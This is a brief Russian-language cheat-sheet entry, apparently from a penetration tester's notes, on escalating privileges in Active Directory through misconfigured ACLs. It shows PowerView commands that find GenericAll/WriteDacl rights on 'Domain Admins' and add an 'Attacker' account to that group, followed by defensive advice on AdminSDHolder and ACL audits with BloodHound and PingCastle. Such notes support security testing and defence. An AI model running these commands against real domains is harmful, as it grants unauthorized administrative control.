#AD #attacks #windows 

> Использование некорректно настроенных списков контроля доступа (ACL) на объектах AD (Пользователях, группах) для повышения привилегий 


PowerView для поиска опасных прав на группе "Domain Admins"
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" }
```

PowerView для добавления себя в группу
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members "Attacker"
```

# Защита
1) Следить за объектов `AdminSDHolder` для защиты привилегированных групп
2) Проводить аудит ACL при помощи **BloodHound** и **PingCastle**